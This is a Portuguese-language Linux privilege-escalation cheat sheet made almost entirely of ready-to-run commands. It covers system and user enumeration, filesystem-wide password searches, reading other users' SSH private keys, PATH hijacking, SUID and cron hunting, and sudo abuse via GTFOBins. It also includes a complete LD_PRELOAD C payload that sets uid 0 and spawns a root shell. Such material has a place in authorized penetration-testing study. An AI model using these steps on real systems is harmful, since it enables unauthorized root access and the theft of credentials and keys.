## Privilege Escalation:

### Obter informações básica

```
uname -a
cat /etc/*release
cat /proc/version
cat /etc/issue
cat lsb_release -a
```

### Usuários

```
cat /etc/passwd | grep sh
cat /etc/group
id
whoami
who
w
```

### Histórico

```
lastlog
last
find -name ".bash_history" -exec cat {} \;
```

### Programas em execução

```
ps -ef
ps aux
htop
top
service --status-all
```

### Exploit de Kernel

```
victim:
uname -a

attacker:
searchsploit linux kernel <versao>
```

### Senhas
```
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
locate password | more
```

### Arquivos graváveis
```
find / -writable -type f -name "*.sh" 2>/dev/null
```

### Arquivos legíveis

```
find / -readable -type f -name "*.py" 2>/dev/null
```

### Configurações de rede

```
cat /etc/resolv.conf
cat /etc/networks
cat /etc/hosts
ifconfig
arp -e
route
netstat -r
```

### Serviços interno

```
netstat -tunlp | grep LISTEN
lsof -i TCP -n -P
lsof -i UDP -n -P
```

### PATH hijacking

```
export PATH=/tmp/attacker:$PATH

# Para reverter execute:

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
```

### SUID/SGUID

```
find / -perm -g=s -type f 2>/dev/null # SGUID
find / -perm -u=s -type f 2>/dev/null # SUID

find / -user root -perm -4000 -print  2>/dev/null # Root SUID
find / -user root -perm -2000 -print  2>/dev/null # Root SGUID
```

### SSH Key

```
find / -readable -type f -name "id_rsa*" 2>/dev/null
find / -readable -type f -name "authorized_keys" 2>/dev/null

cat "/home/*/.ssh/id_rsa.pub"
cat "/home/*/.ssh/id_rsa"
cat "/home/*/.ssh/authorized_keys"
```

### Cron jobs

```
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
```

### NOPASSWORD

```
$ sudo -l

(root) NOPASSWD: /usr/bin/vim

# Vá para https://gtfobins.github.io/ e procure por "vim" e encontre uma parte onde está escrit "SUDO" e execute
```

### LD_PRELOAD

```
# Se o LD_PRELOAD estiver definido em "/etc/sudoers" assim:
Defaults        env_keep += LD_PRELOAD

# Você pode usar isso para criar uma bash com privilégio. Crie um arquivo chamado shell.c dentro de /tmp e coloque o script dentro dele:


#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}

# Depois execute esses comandos:

gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find
id
```

### MySQL

```
https://www.exploit-db.com/exploits/1518
```

### Privesc Scripts

```
LinEnum: https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
Linpeas: https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh
LSE: https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh
Linux Exploit Suggester 2: https://github.com/jondonas/linux-exploit-suggester-2
```

### GTFOBins

```
Melhor site sobre privesc de binários:
https://gtfobins.github.io/
```